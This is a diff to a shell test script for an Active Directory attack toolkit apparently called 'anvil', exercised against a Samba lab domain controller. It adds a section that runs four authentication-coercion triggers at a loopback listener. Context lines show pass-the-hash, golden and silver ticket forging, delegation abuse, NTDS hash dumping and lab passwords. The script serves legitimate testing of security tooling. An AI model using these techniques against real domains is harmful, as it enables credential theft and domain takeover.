@@ -37,7 +37,7 @@ assert_no_fx() {
 
 START=$(date +%s)
 
-echo "== [1/14] readiness: waiting for dc:445 and dc:389 (max 180s) =="
+echo "== [1/18] readiness: waiting for dc:445 and dc:389 (max 180s) =="
 ready=0
 for _ in $(seq 1 60); do
 	if (: </dev/tcp/dc/445) 2>/dev/null && (: </dev/tcp/dc/389) 2>/dev/null; then
@@ -53,7 +53,7 @@ if [ "$ready" -ne 1 ]; then
 fi
 pass "dc ready on 445 + 389"
 
-echo "== [2/14] anvil scan dc (human) =="
+echo "== [2/18] anvil scan dc (human) =="
 SCAN_OUT=$($ANVIL scan dc 2>&1)
 echo "$SCAN_OUT"
 assert_re "scan: 445/tcp open" '445/tcp.*open' "$SCAN_OUT"
@@ -111,7 +111,7 @@ BOTH_RC=$?
 [ "$BOTH_RC" -ne 0 ] && pass "scan both flags: non-zero exit" || fail "scan both flags: exit 0"
 assert_fx "scan both flags: usage error message" "cannot be used together" "$BOTH_OUT"
 
-echo "== [3/14] anvil scan dc --json =="
+echo "== [3/18] anvil scan dc --json =="
 JSON_OUT=$($ANVIL scan dc --json 2>&1)
 assert_fx "scan --json: target" '"target": "dc"' "$JSON_OUT"
 assert_fx "scan --json: dialect key" '"dialect"' "$JSON_OUT"
@@ -119,7 +119,7 @@ assert_fx "scan --json: kerberos key" '"kerberos"' "$JSON_OUT"
 assert_fx "scan --json: nullSession key" '"nullSession"' "$JSON_OUT"
 assert_fx "scan --json: clock skew key" '"clockSkewSeconds"' "$JSON_OUT"
 
-echo "== [4/14] anvil connect (password) =="
+echo "== [4/18] anvil connect (password) =="
 CONN_OUT=$($ANVIL connect --host dc -u alice -p 'AlicePass#2026' -d LAB <<'EOF'
 shares
 sessions
@@ -246,7 +246,7 @@ else
 	fail "filemgmt: /verify/anvil-dir still exists after rm+rmdir"
 fi
 
-echo "== [5/14] anvil connect (pass-the-hash) =="
+echo "== [5/18] anvil connect (pass-the-hash) =="
 NTHASH=$(tr -d '[:space:]' </state/alice.nthash)
 if [ -z "$NTHASH" ]; then
 	fail "pth: /state/alice.nthash is empty"
@@ -266,7 +266,7 @@ EOF
 	assert_fx "pth: kerberoast NTLM bind denied on Samba" "NTLM bind failed" "$PTH_OUT"
 fi
 
-echo "== [6/14] anvil connect (kerberos ccache) =="
+echo "== [6/18] anvil connect (kerberos ccache) =="
 # Mint alice's TGT against the lab KDC, map the FQDN to the container IP
 # (no lab DNS), then connect with the ccache. Realm must be DNS-form
 # (LAB.LOCAL) — the ccache realm drives the exchange.
@@ -294,7 +294,7 @@ assert_fx 'krb: connected as LAB.LOCAL\alice' 'connected dc01.lab.local as LAB.L
 assert_fx "krb: shares lists LABSHARE" "LABSHARE" "$KRB_OUT"
 assert_fx "krb: samr users works over kerberos" "Administrator" "$KRB_OUT"
 
-echo "== [7/14] anvil ticket (golden ticket) =="
+echo "== [7/18] anvil ticket (golden ticket) =="
 # Forge a TGT from the krbtgt NT hash extracted at provision, then attempt
 # to connect with it as Administrator (the /etc/hosts entry for
 # dc01.lab.local was added in [6/10]). Known Samba blockers (see
@@ -337,7 +337,7 @@ EOF
 	assert_re "golden: clean kerberos error (no panic)" 'error: .*(KRB|kerberos|ticket|BADKEYVER|GENERIC)' "$GOLD_OUT"
 fi
 
-echo "== [8/14] anvil ticket (silver ticket) =="
+echo "== [8/18] anvil ticket (silver ticket) =="
 # Forge a service ticket for cifs/dc01.lab.local from the DC machine
 # account's NT hash extracted at provision (the /etc/hosts entry for
 # dc01.lab.local was added in [6/10]). Samba reality, probed against this
@@ -386,7 +386,7 @@ EOF
 	assert_fx "silver: session setup refused (logon failure)" "logon failure" "$SILVER_OUT"
 fi
 
-echo "== [9/14] anvil getst (S4U2Self/Proxy) =="
+echo "== [9/18] anvil getst (S4U2Self/Proxy) =="
 # S4U2Self works on Samba; S4U2Proxy is denied because no RBCD is
 # configured (Samba marks the attribute system-only, so it can't be set in
 # this lab). Assert that reality: self-leg succeeds, proxy-leg gets a clean
@@ -399,7 +399,7 @@ assert_fx "getst: S4U2Self succeeds on Samba" "Requesting S4U2self" "$GETST_OUT"
 [ "$GETST_RC" -ne 0 ] && pass "getst: S4U2Proxy denied without RBCD (nonzero exit)" || fail "getst: expected proxy denial, got rc=0"
 assert_fx "getst: themed delegation denial" "delegation not allowed" "$GETST_OUT"
 
-echo "== [10/14] anvil connect (admin services) =="
+echo "== [10/18] anvil connect (admin services) =="
 # As admin, Samba's svcctl actually enumerates its small synthetic service
 # list (Spooler/NETLOGON/RemoteRegistry/WINS) — assert that reality.
 SVC_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
@@ -455,7 +455,7 @@ assert_fx "adenum laps: (none) on the stock lab (no LAPS schema)" "(none)" "$SVC
 assert_fx 'rbcd get: empty on the DC' 'dc01$ has no RBCD entries' "$SVC_OUT"
 assert_fx "rbcd set: write refused on Samba (system-only attribute)" "can only be modified as system" "$SVC_OUT"
 
-echo "== [11/14] anvil connect (changepasswd, admin reset) =="
+echo "== [11/18] anvil connect (changepasswd, admin reset) =="
 # Admin reset: replace alice's unicodePwd, prove the new password
 # authenticates, then restore her original password so the lab stays
 # deterministic for reruns (earlier sections already used the original).
@@ -491,7 +491,7 @@ EOF
 echo "$CHPW3_OUT"
 assert_fx "changepasswd: alice's original password restored" "password changed for alice" "$CHPW3_OUT"
 
-echo "== [12/14] anvil connect (ntdsdump, admin) =="
+echo "== [12/18] anvil connect (ntdsdump, admin) =="
 # ntdsdump extracts domain hashes offline: VSS-snapshot the DC (vssadmin via
 # TSCH exec as SYSTEM), pull ntds.dit + the SYSTEM hive out of the shadow
 # over C$, then parse the ESE database locally. This Samba lab has none of
@@ -518,7 +518,7 @@ else
 	pass "ntdsdump: no panic"
 fi
 
-echo "== [13/14] anvil connect (addcomputer lifecycle) =="
+echo "== [13/18] anvil connect (addcomputer lifecycle) =="
 # Full lifecycle as admin: SAMR create + LDAP attrs, visible in adenum,
 # then LDAP delete, gone.
 ADDC_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
@@ -548,7 +548,7 @@ else
 	pass "delcomputer: ANVPC gone after delete"
 fi
 
-echo "== [14/15] anvil connect (null session) =="
+echo "== [14/18] anvil connect (null session) =="
 # Samba AD DC (default restrict anonymous = 0) ACCEPTS anonymous session
 # setup and even anonymous srvsvc share enumeration, but tree-connects to a
 # non-guest share are denied. Assert that reality: session establishes,
@@ -564,7 +564,7 @@ else
 	fail "null session: unexpected rc=$NULL_RC or panic in output"
 fi
 
-echo "== [15/15] anvil connect (tier-1/2 features on Samba) =="
+echo "== [15/18] anvil connect (tier-1/2 features on Samba) =="
 # The tier-1/2 command set against the Samba lab. Samba reality here is
 # richer than expected: dacledit/owneredit/samadd/samdel/lookupsid WORK
 # (LDAP SD ops + SAMR aliases + LSARPC are implemented), while the exec
@@ -608,7 +608,7 @@ assert_fx "lookupsid: resolves lab RID 500" "LAB\\Administrator" "$T12_OUT"
 assert_fx "badsuccessor: clean no-schema denial" "no dMSA schema" "$T12_OUT"
 assert_fx "raisechild: clean single-domain refusal" "not a child domain" "$T12_OUT"
 
-echo "== [16/16] anvil connect (slinger-concept features on Samba) =="
+echo "== [16/18] anvil connect (slinger-concept features on Samba) =="
 # The slinger-inspired command set against the Samba lab. Reality here:
 # svc config / time / portfwd list / find / download / enumpipes / ping /
 # reconnect all WORK (stock SMB + srvsvc/svcctl paths Samba implements);
@@ -672,7 +672,7 @@ assert_fx "enumpipes: samr categorized" "samr" "$S16_OUT"
 assert_fx "ping: session alive" "session alive" "$S16_OUT"
 assert_fx "reconnect: re-establishes" "reconnected" "$S16_OUT"
 
-echo "== [17/17] anvil operator batch (Samba) =="
+echo "== [17/18] anvil operator batch (Samba) =="
 # The operator batch against the Samba lab. userenum/spray/gettgt ride
 # the KDC (alice is the lab's no-preauth target); trusts/adcs/whoami take
 # the LDAP channel; loot + transcript are local-file behaviors asserted
@@ -829,6 +829,37 @@ else
 	pass "pkinit: no panic"
 fi
 [ ! -e /tmp/pkinit-op.ccache ] && pass "pkinit: no ccache written on denial" || fail "pkinit: ccache written despite denial"
+
+echo "== [18/18] anvil coercion triggers + TDS/RDP probes (Samba) =="
+# Coercion triggers against the Samba lab. Reality: Samba runs spoolss,
+# so printerbug's RpcOpenPrinter path engages, but the Ex call's outcome
+# is Samba-flavored and not pinned — we assert the four attempts all
+# surface their listener line and the session survives, not a specific
+# result. EFSR, FssagentRpc, and DFSNM admin opnums don't exist there,
+# so those three are themed denials. printerbug's live proof (DC01$
+# connecting back to a loopback listener) is verified manually against
+# the Windows Server 2022 DC, along with the petitpotam/shadowcoerce/
+# dfscoerce patched-DC denials.
+S18_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
+coerce printerbug 127.0.0.1 8444
+coerce petitpotam 127.0.0.1 8444
+coerce shadowcoerce 127.0.0.1 8444
+coerce dfscoerce 127.0.0.1 8444
+exit
+EOF
+)
+S18_RC=$?
+echo "$S18_OUT"
+[ "$S18_RC" -eq 0 ] && pass "coerce: session survives all four methods (exit 0)" || fail "coerce: session survives (got $S18_RC)"
+assert_fx "coerce printerbug: listener line surfaces" "listening on :8444 for the callback" "$S18_OUT"
+assert_fx "coerce petitpotam: no EFSR on Samba, themed" "not supported" "$S18_OUT"
+assert_fx "coerce shadowcoerce: no FSS Agent on Samba, themed" "File Server VSS Agent not available" "$S18_OUT"
+assert_fx "coerce dfscoerce: no DFSNM admin ops on Samba, themed" "not supported" "$S18_OUT"
+assert_no_fx "coerce: no panic" "panic:" "$S18_OUT"
+# TDS/RDP probes ride the scan section's absence rule: 1433 and 3389 are
+# closed on Samba, so neither section renders.
+assert_no_fx "scan: no MSSQL section on Samba" "MSSQL" "$SCAN_OUT"
+assert_no_fx "scan: no RDP section on Samba" "RDP" "$SCAN_OUT"
 
 END=$(date +%s)
 echo "== summary =="
